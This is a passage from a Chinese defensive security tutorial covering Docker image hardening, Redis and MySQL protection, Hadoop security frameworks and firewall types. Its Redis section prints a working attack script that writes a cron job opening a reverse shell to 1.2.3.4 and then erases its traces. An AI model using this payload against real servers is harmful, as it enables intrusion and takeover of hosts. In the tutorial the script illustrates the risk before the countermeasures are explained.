class="code"><pre><span class="line"><span class="keyword">FROM</span> node</span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> . ./</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [“node”, “index.js”]</span></span><br></pre></td></tr></table></figure><p>这个基础的 node 镜像实际包含了一个完整的操作系统，但是，在实际应用中，有大部分的系统功能，我们是用不到的。而这些用不到的系统功能，却正好为黑客提供了可乘之机。</p><p>Snyk 在 2019 年的Docker 漏洞统计报告称，最热门的 10 个 Docker 基础镜像，包含的已知系统漏洞，最少的有 30 个，最多的有 580 个。</p><p>这是非常惊人的。通过一句简单的 FROM node，就能让你的 Docker 镜像中引入 580 个系统漏洞。那我们该如何避免引入漏洞呢？这个时候，我们就需要使用精简版的基础镜像了。一般来说，精简版的 Docker 镜像标签都会带有 slim 或者 alpine。</p><p>比如说，如果你采用 node:10-slim，那么漏洞数会降低到 71 个。如果使用 node:10-alpine，那么已知的漏洞数会降为 0。之所以会发生这种现象，是因为使用精简版的基础镜像，可以去除大部分无用的系统功能和依赖库，所以，存在于这些功能中的漏洞自然也就被剔除了。</p><p>因此，对于 Docker 来说，通过使用精简的基础镜像，去除一些无用的系统功能，既能够降低最终镜像的体积，又能够降低安全风险，何乐而不为呢？</p><h4 id="Docker-中的最小权限原则"><a href="#Docker-中的最小权限原则" class="headerlink" title="Docker 中的最小权限原则"></a>Docker 中的最小权限原则</h4><p>除此之外，我们在 Linux 操作系统中提到的最小权限原则，在 Docker 镜像中同样适用。</p><p>这是因为，在默认情况下，容器内的进程是都以 ROOT 权限启动的。而 Docker 又是伪隔离，所以，容器就和宿主机拥有一致的 ROOT 权限了。虽然 Docker 通过 Capabilities，对容器内的 ROOT 能力进行了限制。但是，使用 ROOT 权限去运行一个普通的服务很不合适。为此，我们可以通过 USER 关键词，来使用一个低权限的用户运行服务。</p><p>以 Node.js 为例，在 node 的基础镜像中，默认创建了 node 这么一个具备较小权限的用户。因此，我们可以在 Dockerfile 中，加入一行 USER node 来使用这个最小权限用户。</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:<span class="number">10</span>-alpine </span><br><span class="line">...</span><br><span class="line"><span class="keyword">USER</span> node</span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [“node”, “index.js”]</span></span><br></pre></td></tr></table></figure><p>当然，如果有的基础镜像本身不提供额外的用户，你就需要自己创建一个了。以 ubuntu 为例，我们可以通过 groupadd 和 useradd，创建一个 node 用户，这个用户没有密码、没有 home 目录、也没有 shell，就是一个最小权限用户。Dockerfile 的内容如下：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> groupadd -r node &amp;&amp; useradd -r -s /bin/<span class="literal">false</span> -g node node</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">USER</span> node</span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> node index.js</span></span><br></pre></td></tr></table></figure><p>现在，你应该已经知道 Docker 镜像的两种安全防护方法了，我来简单总结一下。第一个是通过使用最精简的基础镜像，来删减 Docker 镜像中不必要的功能，从而降低出现漏洞的概率。第二个则是采取最小权限原则，以低权限用户来执行服务，限制黑客的能力。</p><h2 id="数据库安全"><a href="#数据库安全" class="headerlink" title="数据库安全"></a>数据库安全</h2><h3 id="Redis-安全"><a href="#Redis-安全" class="headerlink" title="Redis 安全"></a>Redis 安全</h3><p>我们首先来看 Redis。我们都知道，Redis 是一个高性能的 KV 结构的数据库。Redis 的设计初衷是在可信的环境中，提供高性能的数据库服务。因此，Redis 在设计上没有过多地考虑安全性，甚至可以说它刻意地牺牲了一定的安全性，来获取更高的性能。</p><p>那在安全性不高的情况下，黑客连入 Redis 能做什么呢？最直接的，黑客能够任意修改 Redis 中的数据。比如，通过一个简单 FLUSHALL 命令，黑客就能够清空整个 Redis 的数据了。</p><p>复杂一些的，黑客还可以发起权限提升，通过 Redis 在服务器上执行命令，从而控制整个服务器。但是，Redis 本身不提供执行命令的功能，那么黑客是如何让 Redis 执行命令的呢？我们一起来看一下具体的代码流程。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">r = redis.Redis(host=10.0.0.1, port=6379, db=0, socket_timeout=10)</span><br><span class="line">payload = <span class="string">'\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/1.2.3.4/8080 0&gt;&amp;1\n\n'</span></span><br><span class="line">path = <span class="string">'/var/spool/cron'</span></span><br><span class="line">name = <span class="string">'root'</span></span><br><span class="line">key = <span class="string">'payload'</span></span><br><span class="line">r.set(key, payload)</span><br><span class="line">r.config_set(<span class="string">'dir'</span>, path)</span><br><span class="line">r.config_set(<span class="string">'dbfilename'</span>, name)</span><br><span class="line">r.save()</span><br><span class="line">r.delete(key)  <span class="comment"># 清除痕迹</span></span><br><span class="line">r.config_set(<span class="string">'dir'</span>, <span class="string">'/tmp'</span>)</span><br></pre></td></tr></table></figure><p>针对这个过程，我来详细解释一下，你可以结合代码来看。</p><ul><li>黑客连入 Redis。</li><li>黑客写入一个任意的 Key，对应的 Value 是想要执行的命令，并按照 Crontab 的格式进行拼接。代码如下：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1* * * * /bin/bash -i &gt;&amp; /dev/tcp/1.2.3.4/80800&gt;&amp;1</span><br></pre></td></tr></table></figure><ul><li>黑客调用 config_set 方法，就是通过 Redis 的 CONFIG 命令，将 Redis 数据持久化的目录修改成 /var/spool/cron。</li><li>黑客调用 save 方法，通过 Redis 的 SAVE 命令，发起 Redis 的数据持久化功能。最终，Redis 将数据写入到 /var/spool/cron 中。写入的文件效果如下：</li></ul><p><img src="/images/security/security-linux/8.jpg" alt="8"></p><ul><li>Crontab 对于无法解析的数据会直接跳过，因此，开头和结尾的乱码不会影响 Crontab 的执行。最终，Crontab 会执行到 Value 中对应的命令。</li></ul><p>这样一来，黑客就“聪明”地利用 Redis 保存文件的功能，修改了 Crontab，然后利用 Crontab 执行了命令。</p><p>那么，我们该如何对 Redis 进行安全防护呢？这里就需要提到我们前面讲过的“黄金法则”和“最小权限原则”了。</p><p>首先，从认证上来说，Redis 提供了最简单的密码认证功能。在 Redis 的配置文件中，只要增加一行 requirepass 123456，我们就能够为 Redis 设置一个密码了。但是，这里有两点需要你注意。</p><ul><li><p>Redis 的性能很高，理论上黑客能够以每秒几十万次的速度来暴力猜测密码。因此，你必须设置一个足够强的密码。我比较推荐随机生成一个 32 位的“数字加字母”的密码。而且 Redis 的密码直接保存在配置文件当中，你并不需要记忆它，需要的时候直接查看就好了。</p></li><li><p>Redis 是为了高性能而设计的。之所以 Redis 默认不配置密码，就是因为密码会影响性能。按照我之前的测试，加上密码之后，Redis 的整体性能会下降 20% 左右。这也是很多开发和运维，明明知道 Redis 有安全风险，仍然保持无密码状态的原因。所以，是否给 Redis 设置密码，还需要你根据实际的情况进行权衡。</p></li></ul><p>其次是进行授权。尽管 Redis 本身不提供授权机制，但是我们仍然可以通过“重命名”来间接地实现授权功能。我们可以在 Redis 的配置文件中加入 rename-command CONFIG pUVEYEvdaGH2eAHmNFcDh8Qf9vOej4Ho，就可以将 CONFIG 功能的关键词，变成一个随机的字符串，黑客不知道这个字符串，就无法执行 CONFIG 功能了。而且，你仍然可以通过新的命令，来正常的使用 CONFIG 功能，不会对你的正常操作产生任何影响。</p><p>现在，你应该已经知道在认证和授权上，我们能使用的防护手段了。那在审计上，因为 Redis 只提供了基本的日志功能（日志等级分为：Debug、Verbose、Notice 和 Warning），实用信息不多，也就没有太多的应用价值。</p><p>除了认证和授权，如果你还想要对 Redis 中的数据进行加密，那你只能够在客户端中去集成相应的功能，因为 Redis 本身不提供任何加密的功能和服务。</p><p>最后，我们还要避免使用 ROOT 权限去启动 Redis，这就需要用到“最小权限原则”了。在前面命令执行的例子中，黑客是通过 Redis 的保存功能，将命令“写入 Crontab”来实现的命令执行功能。而“写入 Crontab”这个操作，其实是需要 ROOT 权限的。因此，我们以一个低权限的用户（比如 nobody）身份来启动 Redis，就能够降低黑客连入 Redis 带来的影响了。当然，Redis 本身也需要保存日志和持久化数据，所以，它仍然需要写入日志文件的权限（小于 ROOT 权限）来保证正常运行。</p><p>总结来说，Redis 是一个极度看重性能的数据库，为了性能舍弃掉了部分的安全功能。我们可以通过“增加密码”“使用最小权限原则”和“授权”的方式，在一定程度上提升 Redis 的安全性。但是，这些防护手段更多的是一种缓解机制，为了保证安全性，我们最好是只在可信的网络中使用 Redis。</p><h3 id="MySQL-安全"><a href="#MySQL-安全" class="headerlink" title="MySQL 安全"></a>MySQL 安全</h3><p>讲到这里，你现在应该也能总结出，黑客攻击数据库的主要方式，除了执行各种命令对数据库中的数据进行“增删改查”，就是在连入数据库后，通过各种手段实现命令执行，最终控制整个服务器。</p><p>因为 MySQL 的功能十分强大，自身就提供了和本地文件交互的功能。所以，通过 LOAD DATA INFILE，MySQL 可以读取服务器的本地文件；通过 SELECT … INTO DUMPFILE，MySQL 也能够将数据写入到本地文件中。因此，在黑客连入 MySQL 之后，通过读文件的功能，黑客就能够对服务器的任意文件进行读取，比如敏感的 /etc/passwd 或者应用的源代码等；通过写文件的功能，则可以仿照 Redis 修改 Crontab 的原理，实现命令执行的功能。</p><p>相比于 Redis，MySQL 是一个比较成熟的数据库工具，自身的安全性就很高，所以通过正确地配置 MySQL 的安全选项，我们就能够获得较高的安全保障。</p><p>那么，MySQL 在黄金法则和加密上，分别提供了哪些功能呢？</p><p>MySQL 提供了多用户的认证体系，它将用户的相关信息（认证信息、权限信息）都存储在了 mysql.user 这个系统表中。利用这个系统表，MySQL 可以通过增删改查操作，来定义和管理用户的认证信息、权限列表等。</p><p>除此之外，在认证上，MySQL 还提供了比较完善的密码管理功能，它们分别是：</p><ul><li>密码过期，强制用户定期修改密码；</li><li>密码重用限制，避免用户使用旧的密码；</li><li>密码强度评估，强制用户使用强密码；</li><li>密码失败保护，当用户出现太多密码错误的尝试后锁定账户。</li></ul><p>那么，通过这些密码管理的机制，你就能够拥有一个相对安全的认证体系了。</p><p>在多用户的认证体系中，授权是必不可少的。那 MySQL 中的授权机制是怎样的呢？</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> db.table <span class="keyword">TO</span> <span class="keyword">user</span>@<span class="string">"127.0.0.1"</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">"password"</span></span><br></pre></td></tr></table></figure><p>我们通过修改权限的 GRANT 命令来具体分析一下，MySQL 授权机制中的主体、客体和请求。</p><ul><li>主体（user@“127.0.0.1” IDENTIFIED BY “password”）：MySQL 的主体是通过用户名、IP 和密码这三个信息组合起来进行标记的。</li><li>客体（db.table）：MySQL 的客体是数据库和表。</li><li>请求（ALL PRIVILEGES）：MySQL 将请求的类型定义成了特权（PRIVILEGES）。常见的特权有 INSERT、DELETE 等增删改查操作（如果你想要了解其他更细粒度的特权，可以在官方文档中进行查看）。</li></ul><p>除此之外，MySQL 也定义了 ROLE 的概念，你可以基于这个功能，去实现 role-BAC 机制。</p><p>虽然和 Redis 一样，MySQL 本身也不提供审计功能。但是，MySQL 可以通过第三方插件，来提供审计的服务。比如 McAfee 提供的mysql-audit以及MariaDB Audit Plugin。这些插件能够自动收集必要的 MySQL 操作信息，并推送到你的 ELK 等日志集群中，方便你进行持续的审计操作。</p><p>在加密方面，MySQL 既提供传输过程中 SSL（Security Socket Layer）加密，也提供存储过程中硬盘加密。</p><p>我们首先来看 MySQL 的 SSL 加密功能。开启 SSL 功能，需要在配置文件中配置如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">ssl-ca&#x3D;ca.pem</span><br><span class="line">ssl-cert&#x3D;server-cert.pem</span><br><span class="line">ssl-key&#x3D;server-key.pem</span><br></pre></td></tr></table></figure><p>但是，这些配置并不能强制客户端使用 SSL 连接。想要杜绝全部非安全连接的话，我们可以在配置文件中添加 require_secure_transport=ON，来进行强制限制。</p><p>接着，我们来看，MySQL 中提供的硬盘加密功能。硬盘加密过程主要涉及两个密钥，一个主密钥和一个表密钥。表密钥由 MySQL 随机生成，通过主密钥进行加密后，存储在表头信息中。因此，每一个表格都拥有不同的密钥。</p><p>MySQL 的加密功能是由 keyring_file 这个插件来提供的。需要注意的是，当 keyring_file 第一次启动的时候，它会生成一个主密钥文件在当前的系统中。你一定要备份这个密钥文件，因为它一旦丢失，数据库中的全部数据，都将因为无法解密而丢失。</p><p>现在，你应该了解了，MySQL 在黄金法则上都提供了哪些功能。接下来，我们再来看“最小权限原则”。</p><p>和 Redis 一样，MySQL 也需要避免以 ROOT 权限启动。不一样的是，MySQL 默认提供了这样的能力，当我们在 Linux 中通过 mysqld 来启动 MySQL 进程的时候，mysqld 会自动的创建一个具备最小权限的 mysql 用户，并赋予这个用户对应日志文件的权限，保证 MySQL 拥有必要的最小权限。</p><p>总之，MySQL 是一个非常成熟的数据库工具，它提供了完整的安全功能。通过对认证、授权、审计和加密功能的正确配置，你就能够迅速提升 MySQL 的整体安全性。</p><p>今天，我们以 Redis 和 MySQL 这两种比较典型的数据库为例，对它们的安全性，以及攻破后能产生的危害进行了分析。在这里，我把安全防护的关键内容总结了一张表格，希望能够帮助你加深理解。</p><p><img src="/images/security/security-linux/9.jpg" alt="9"></p><h2 id="分布式安全"><a href="#分布式安全" class="headerlink" title="分布式安全"></a>分布式安全</h2><p>如今，大数据处理已经成为了每一个应用和公司都必备的业务。因此，除了数据库之外，分布式的平台和框架也是开发人员最熟悉的工具之一。</p><p>说到分布式，就不得不提到 Hadoop。Hadoop 可以说是一个划时代的分布式框架，底层的 HDFS 提供了大数据存储的文件系统支持，YARN 提供了大数据运算的资源调度能力，而 MapReduce 的计算框架，更是彻底革新了数据运算的方式。基于此，Hadoop 又衍生了一系列的分布式工具和数据处理生态圈。</p><p>可以说，Hadoop 是分布式框架的根基。所以，我们今天就以 Hadoop 为例，探讨一下分布式框架的安全性。</p><h3 id="针对-Hadoop-的攻击方式有哪些？"><a href="#针对-Hadoop-的攻击方式有哪些？" class="headerlink" title="针对 Hadoop 的攻击方式有哪些？"></a>针对 Hadoop 的攻击方式有哪些？</h3><p>Hadoop 最开始是设计工作在可信的网络中的，所以，Hadoop 的默认安全防护机制并不强。这也就使得 Hadoop 中的数据安全得不到保障。而 Hadoop 作为大数据的处理框架，可以说公司大部分的数据都会落到其中进行处理。因此，Hadoop 中数据 CIA 的重要性，甚至比普通的数据库更高。</p><p>那么，黑客可以通过哪些方式来攻击 Hadoop 呢？</p><p>首先，最直接也是最常见的，也就是在默认情况下，Hadoop 没有集成认证和授权功能，任何人都可以通过客户端的形式连入到 Hadoop 集群中。所以，黑客可以任意地增删改查 HDFS 中的数据，也可以任意地提交 Hadoop 任务，来进行自己想要的数据操作。</p><p>除了直接的越权访问，黑客也可以通过一些间接的方式，来窃取 Hadoop 中的数据。比如，Hadoop 节点间的数据传输默认都是明文的。因此，即使黑客无法连入到 Hadoop 集群中，它们也可以通过控制交换机等网络设备，同样能够获得很多的数据信息。</p><p>最后，因为 Hadoop 能够很好地支持节点的增加和删除操作。所以，黑客可以以一个节点的身份加入到 Hadoop 集群中。这样一来，数据就会自动流转到黑客的节点中。如果伪装的是具备调度功能的 NameNode，黑客还能够对整个 Hadoop 集群的资源调度进行干预和影响。</p><h3 id="Hadoop-自带的安全功能有哪些？"><a href="#Hadoop-自带的安全功能有哪些？" class="headerlink" title="Hadoop 自带的安全功能有哪些？"></a>Hadoop 自带的安全功能有哪些？</h3><p>现在，你应该知道了，黑客针对 Hadoop 的攻击一旦发生，就会造成非常大的危害。那我们该如何提高 Hadoop 的安全性呢？和数据库一样，我们还是分别从认证、授权、审计和加密这四个方面来看。</p><h3 id="黄金法则在-Hadoop-上如何应用？"><a href="#黄金法则在-Hadoop-上如何应用？" class="headerlink" title="黄金法则在 Hadoop 上如何应用？"></a>黄金法则在 Hadoop 上如何应用？</h3><p>首先，我们来看，如何给 Hadoop 加上认证的功能。目前，Hadoop 支持了基于 Kerberos 协议的认证功能，我们可以在配置文件中使用。</p><p>那 Kerberos 协议是什么呢？Kerberos 协议和我们之前讲过的单点登录机制（CAS 流程）很类似，都是向认证中心获取一个认证 Token，然后根据 Token 去完成服务的认证。区别在于，Kerberos 都是主动向认证中心发起认证，不需要服务去进行重定向操作。</p><p><img src="/images/security/security-linux/10.jpg" alt="10"></p><p>接下来，我带你梳理一下 Kerberos 的流程，你可以结合上面的流程图来看。</p><p>用户在向 KDC（Kerberos 的认证中心）发起登录之后，会获取一个 Token（Kerberos 的 ST），然后通过这个 Token 去访问对应的服务。Token 中包含了签名，因此服务方可以自行验证 Token 的合法性。在认证完成之后，服务方就可以向用户提供服务了。</p><p>Kerberos 比较适用于服务与服务之间的认证，对应到 Hadoop 的场景中，就是 Hadoop 集群中内部各个节点之间的认证。</p><p>那么，在使用了 Kerberos 认证机制后，我们要怎么去配置每一个 Hadoop 节点，来完成 Hadoop 集群的认证呢？这就需要我们在初始化 Hadoop 的各个节点时，为每个节点申请一个 Kerberos 的密钥文件 Keytab。</p><p>Keytab 文件会使用一个 Principal 作为唯一的身份标识。Principal 的格式如下：username/host@realm。可以看到，Principal 由三个部分组成：username、host 和 realm。</p><p>其中，“username”是服务所对应的用户身份。比如，Hadoop 的服务会分别以 hdfs 用户运行 HDFS 服务、以 yarn 用户运行 YARN 服务、以 mapred 用户运行 MapReduce 服务。因此，对应各个服务节点的“username”就是 hdfs、yarn 和 mapred。</p><p>“host”即为服务节点在 DNS 中的主机名，“realm”为域标示，可以使用根域名来替代，比如 BAIDU.COM。</p><p>现在，我们知道，通过 Principal，Keytab 文件会和节点的服务类型以及 Host 进行绑定。这样一来，每个服务节点都具备了能证实身份的唯一 ID 和密钥，也就可以保证在整个 Hadoop 集群中，各个节点都是可信任的。</p><p>Kerberos 协议同样可以完成对用户的授权。当认证开启后，只要用户登录一台配置好了 Kerberos 密钥的服务器，就能以节点的身份向 Hadoop 发起认证了。</p><p>总体来说，因为不同的 Hadoop 工具（Hive、HDFS 等）对授权和审计有不同的需求，所以，这些授权和审计功能通常会放到具体工具中去实现，无法由底层的 Hadoop 统一完成。而这种不统一会增加 Hadoop 管理的工作量，因此，在实际工作中，我们往往会选择通过集成额外的安全框架，来对授权和审计进行统一管理。我会在 Hadoop 安全框架的内容中，详细来讲解授权和审计机制。</p><h3 id="Hadoop-中有哪些加密形式？"><a href="#Hadoop-中有哪些加密形式？" class="headerlink" title="Hadoop 中有哪些加密形式？"></a>Hadoop 中有哪些加密形式？</h3><p>在黄金法则之外，我们需要考虑的另外一点就是数据加密。和 MySQL 数据库一样，Hadoop 也支持对硬盘数据进行加密存储，这个过程主要集中在 HDFS 中：当数据写入 HDFS 时，数据会自动加密；当需要从 HDFS 读取数据时，数据会自动解密。在 MySQL 中，我们是以表为单位分配不同的密钥；在 HDFS 中，则需要我们主动创建 Zone 来进行加密。</p><p>比如，通过下面的命令，我们能够在 HDFS 中创建一个 /zone 目录，对 /zone 目录中的所有数据进行加密。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hadoop fs -mkdir /zone</span><br><span class="line">hdfs crypto -createZone -keyName mykey -path /zone</span><br></pre></td></tr></table></figure><p>但是，和 MySQL 数据库不同的是，HDFS 是一个分布式的存储系统，一份大数据会被分成若干个小数据，存储在不同的服务节点上。那么，HDFS 是怎么对加密密钥进行管理的呢？Hadoop 提供了一个密钥管理中心 KMS，当 HDFS 需要进行加解密操作时，会根据用户信息，向 KMS 请求对应的密钥，从而完成数据的加解密工作。</p><h3 id="通过-Hadoop-安全框架来加强安全功能"><a href="#通过-Hadoop-安全框架来加强安全功能" class="headerlink" title="通过 Hadoop 安全框架来加强安全功能"></a>通过 Hadoop 安全框架来加强安全功能</h3><p>Hadoop 作为一个成熟的开源框架，当出现安全需求时，各个公司都会对其进行安全加固。当这些加固的技术成熟时，部分公司就会对这些技术进行整理，包装成为 Hadoop 提供安全加固的框架供我们使用。</p><p>接下来，我就从我最熟悉的 3 个知名安全框架入手，为你详细讲解这些安全框架分别为 Hadoop 提供了哪些安全机制。</p><p>首先我们来看 Apache Knox。</p><p>Apache  Knox 是一个针对 Hadoop 集群的网关。所有对 Hadoop 集群的请求，需要先发送给 Apache Knox，然后由 Apache Knox 代理到 Hadoop 集群中去。对于用户来说，只能够看到 Apache Knox 的网关，而不能够直接和 Hadoop 集群进行通信。通过网关的形式，Apache Knox 将所有和 Hadoop 交互的行为进行了统一收口。在此基础之上，Apache Knox 就可以为 Hadoop 提供统一的安全管理能力，也就是进行用户的认证、授权和审计等工作。</p><p><img src="/images/security/security-linux/11.jpg" alt="11"></p><p>接着，我们再来说一说 Apache Sentry。</p><p>Apache Sentry 相当于一个为 Hadoop 提供集中式授权的中心。它在 Hive、Impala 等数据引擎中添加一个插件，拦截所有对数据引擎的请求，并转发到 Apache Sentry 的授权中心。然后 Apache Sentry 会基于 role-BAC 的访问控制方式，对请求进行具体的授权。对于 Hadoop 的各类组件来说，Apache Sentry 是一个比较独立的授权引擎，可以随时地引入或者撤除。也就是说，Apache Sentry 为 Hadoop 提供了可“插拔式”的授权能力。</p><p><img src="/images/security/security-linux/12.jpg" alt="12"></p><p>最后是 Apache Ranger。</p><p>Apache Ranger 提供了一个集中制的访问控制机制。通过 Apache Ranger 的管理后台，我们可以很方便地管理各类资源的授权机制。而且，这些授权机制是通过一个轻量级的 Java 插件，运行在各类工具的服务进程（比如 HDFS 的 namenode 进程，Hive 的 Hive2Server 进程等）中，所以，在 Hadoop 的服务节点上，不需要运行额外的进程。尽管耦合性更强，但 Apache Ranger 更便于管理，它相当于在每一个 Hadoop 工具中都加入了授权的能力。</p><p><img src="/images/security/security-linux/13.jpg" alt="13"></p><p>为了帮助你加深理解，我把这三个安全框架的功能简单地总结了一张表格。</p><p><img src="/images/security/security-linux/14.jpg" alt="14"></p><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>黑客在网络攻击时，第一步会扫描系统对外开放的端口，尝试发起连接或者攻击。比如，黑客可以扫描公司公网 IP 的 22 端口（SSH 服务），然后尝试爆破登录。这个时候，通过防火墙，我们既可以屏蔽掉开放的 22 端口，也能拦截爆破的请求。所以，防火墙是面对外部入侵的第一道防线。</p><h3 id="防火墙如何为网络提供保护？"><a href="#防火墙如何为网络提供保护？" class="headerlink" title="防火墙如何为网络提供保护？"></a>防火墙如何为网络提供保护？</h3><p>防火墙是部署在网络边界上的一种安全设备，其概念比较宽泛，根据需求不同可以工作在 OSI（Open System Interconnection，开放式系统互联） 网络模型的一层或多层上。一般情况下，防火墙会和路由器搭配使用（或者说路由器能够承担部分防火墙的功能），来对网络进行隔离。</p><p>根据实现方式和功能的不同，防火墙可以分为三种类型：包过滤防火墙、应用网关防火墙和状态检测防火墙。</p><h4 id="包过滤防火墙"><a href="#包过滤防火墙" class="headerlink" title="包过滤防火墙"></a>包过滤防火墙</h4><p>包过滤防火墙工作在网络层和传输层上。在这两个层级中，网络请求都是以 TCP 或者 UDP 数据包的形式进行流动的。因此，包过滤防火墙是通过检测并拦截所有流经防火墙的 TCP 和 DUP 数据包，来对系统提供保护。它能够获取到的信息包括：源 IP 和端口、目标 IP 和端口、协议号等。由于大部分的路由器甚至 Linux 系统本身（Iptables）也具备类似的功能。因此，通常情况下，我们不需要采购额外的设备部署包过滤防火墙，只需要直接对网络边界的路由器进行设置，就能够满足最基本的拦截需求了。</p><p>但是，在防护能力上，包过滤防火墙是比较弱的，它只能提供最基础的安全防护。这是因为，包过滤防火墙的过滤规则基本都是静态的。也就是说，包过滤防火墙只能够通过匹配 IP 地址和端口号，判断这些信息是否命中特定的规则来进行过滤。比如，禁止外网 IP 访问 80 和 443 以外的公司 IP 端口。所以，现在大部分的包过滤防火墙都进行了升级，引入了诸如“连接状态”等概念，也就变成了状态检测防火墙。</p><h4 id="应用网关防火墙"><a href="#应用网关防火墙" class="headerlink" title="应用网关防火墙"></a>应用网关防火墙</h4><p>应用网关防火墙以代理的模式工作在应用层。所谓“代理”，即接收客户端发出的请求，然后以客户端的身份将请求再发往服务端。大部分的系统和应用都是工作在应用层的，因此，应用网关防火墙能够获取到系统和应用的全部信息，从而实现更复杂的功能，如：内容监控、认证、协议限制甚至缓存。</p><p>在包过滤防火墙中，防火墙直接对流经的 TCP 和 UDP 包进行处理。而应用网关防火墙需要对 TCP 和 UDP 包进行解析，处理成应用层的数据协议，如 HTTP。因此应用网关防火墙对于网络的性能会产生负面影响，而且不是所有的应用都能够很好地兼容代理的存在，所以部署应用网关防火墙有可能对系统的可用性产生影响。除此之外，在应用网关防火墙中，服务端看到的请求都来自于代理，这会导致服务端无法有效地追踪请求的来源。</p><p>尽管应用网关防火墙有这些潜在的危害存在，但是它能处理的信息最多，能够提供的安全防护能力也最强。由于 Web 攻击是黑客常见的攻击手段，因此，应用网关防火墙也逐渐演变成了专门的 Web 防火墙。</p><h4 id="状态检测防火墙"><a href="#状态检测防火墙" class="headerlink" title="状态检测防火墙"></a>状态检测防火墙</h4><p>状态检测防火墙是包过滤防火墙的一种升级，它同样工作在网络层和传输层之上。状态检测和包过滤防火墙最大的不同在于，它会以连接的形式来“看待”低层级的 TCP 和 UDP 数据包。举个简单的例子。</p><p>当客户端发起一次完整的 HTTP 请求时，会需要进行“TCP 三次握手”建立连接（SYN+ACK 数据包），HTTP 请求和响应的数据往往也是通过多个数据包才能完整发送。传统的包过滤防火墙只能基于每一个数据包进行判断，比如在“握手”的过程中，包过滤防火墙会分别看到 SYN、SYN+ACK、ACK 这三个数据包，并对每一个数据包进行判断。而事实上，这三个数据包（SYN、SYN+ACK、ACK）代表的是一次握手请求。所以，状态检测防火墙会尝试将这一连串的数据包组成一次完整的连接请求，从而获得一个更全面的视角，大大提高其安全性。</p><p>对比应用网关防火墙，状态检测防火墙通常不会尝试将数据包构建成高层级的数据，也就是说它不会尝试去解析整个 HTTP 请求中的内容。因此，状态检测防火墙能获得更优的性能。目前市面上普遍采用的，都是状态检测防火墙。</p><p><img src="/images/security/security-linux/15.jpg" alt="15"></p><h3 id="防火墙可以为网络边界提供哪些保护呢？"><a href="#防火墙可以为网络边界提供哪些保护呢？" class="headerlink" title="防火墙可以为网络边界提供哪些保护呢？"></a>防火墙可以为网络边界提供哪些保护呢？</h3><p>网络边界之间的信用层级通常是不一样的，因此，我们需要利用防火墙在网络边界上提供必要的保护，使得跨越边界的数据和连接相对可信。</p><h4 id="保护操作系统的漏洞"><a href="#保护操作系统的漏洞" class="headerlink" title="保护操作系统的漏洞"></a>保护操作系统的漏洞</h4><p>在操作系统的发展历程中，出现过很多臭名昭著的漏洞。比如：由于对网络请求处理不当，导致的 DDoS 攻击（如死亡之 PING、SYN 洪泛等）；由于高危服务默认开放导致的代码执行（如熊猫烧香扫描的是 135 和 445 端口的弱密钥）；由于服务漏洞导致的代码执行（如永恒之蓝利用的 SMB 漏洞）</p><p>如果在这些漏洞曝光时，我们能即时更新操作系统补丁、关闭对应服务，那自然是能够避免系统和应用受到侵害。但是，在通常情况下，尤其是当公司扩大规模的时候，服务器管理员意识到问题并采取措施的这段响应时间，已经足够病毒或者蠕虫进行大规模地传播了。</p><p>这时，防火墙的存在就很有必要了。一方面，防火墙可以迅速对全网的服务器进行保护，拒绝向高危端口发起的请求，如 Windows 中的 135、137 和 445 等，这也就是我们之前所说的“虚拟补丁”。另一方面，更加智能的防火墙，能够检测到整体流量中的异常变化，比如，突然出现了针对某个端口的大量请求，这就说明系统或者应用中很可能出现了新的漏洞，这时，防火墙可以产生报警甚至自动对异常的请求进行拦截，及时避免网络中的操作系统受到攻击。</p><h4 id="阻止非法的信息流动"><a href="#阻止非法的信息流动" class="headerlink" title="阻止非法的信息流动"></a>阻止非法的信息流动</h4><p>在网络边界之间流动的数据，往往都会受到一定的规则约束。最著名的有中国的防火长城（Great 